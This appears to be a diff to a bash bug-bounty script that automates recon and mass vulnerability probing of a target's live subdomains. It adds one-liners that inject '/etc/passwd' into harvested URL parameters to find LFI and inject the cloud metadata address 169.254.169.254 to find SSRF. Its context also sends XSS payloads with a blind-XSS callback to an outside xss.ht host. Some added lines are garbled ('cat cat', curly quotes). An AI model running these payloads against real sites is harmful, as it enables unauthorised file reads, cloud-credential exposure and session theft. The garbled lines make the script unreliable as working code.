@@ -1,6 +1,6 @@
 #!/bin/bash
 
-mkdir  -p $1/{recon,nuclei,jaeles,subtko,waybackurls,js,eyewitness,ports,BLC,clickjack,Dalfox,Directory}
+mkdir  -p $1/{recon,nuclei,jaeles,subtko,waybackurls,js,eyewitness,ports,BLC,clickjack,Dalfox,Directory,Misc}
 echo  "***************************************************************************"
 
 echo "Gathering Subdomain"
@@ -102,6 +102,10 @@ echo "Searching for Links"
 echo "***************************************************************************"
 for domain in $(cat $1/recon/ALive.txt);do echo e "\n\n============URL: "$domain"================";python3 ~/tools/LinkFinder/linkfinder.py -i $domain -o cli;done| tee $1/waybackurls/js_link.txt
 
+echo "Sending to Paramspider"
+echo "***************************************************************************"
+for domain in $(cat cat $1/recon/ALive.txt);do python3 ~/tools/ParamSpider/paramspider.py -d $domain --quiet --level high --exclude woff,css,js,png,svg,php,jpg;done | tee $1/recon/params.txt
+
 echo "Checking For Broken Links"
 echo "***************************************************************************"
 for domain in $(cat $1/recon/ALive.txt );do blc $domain;done |tee $1/BLC/broken_link.txt
@@ -112,9 +116,12 @@ sleep 15
 python3 ~/tools/clickjack/clickjack.py $1/recon/ALive.txt | grep -v "NOT" | awk '{print $2}' |tee $1/clickjack/vulnerable.txt
 
 
-echo "Testing for XSS"
+echo "Testing for XSS + LFI + SSRF"
 echo "***************************************************************************"
 cat $1/waybackurls/wayback.txt | gf xss | dalfox pipe -b h3110mb.xss.ht | tee $1/Dalfox/poc.txt
+cat $1/waybackurls/wayback.txt | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' |tee $1/Misc/LFI.txt
+cat $1/waybackurls/wayback.txt |qsreplace ‘http://169.254.169.254/latest/meta-data/hostname’ | xargs -I % -P 25 sh -c ‘curl -ks “%” 2>&1 | grep ”compute.internal” && echo “SSRF VULN! %”’ |tee $1/Misc/ssrf.txt
+
 
 echo "Doing DirSearch"
 echo "***************************************************************************"
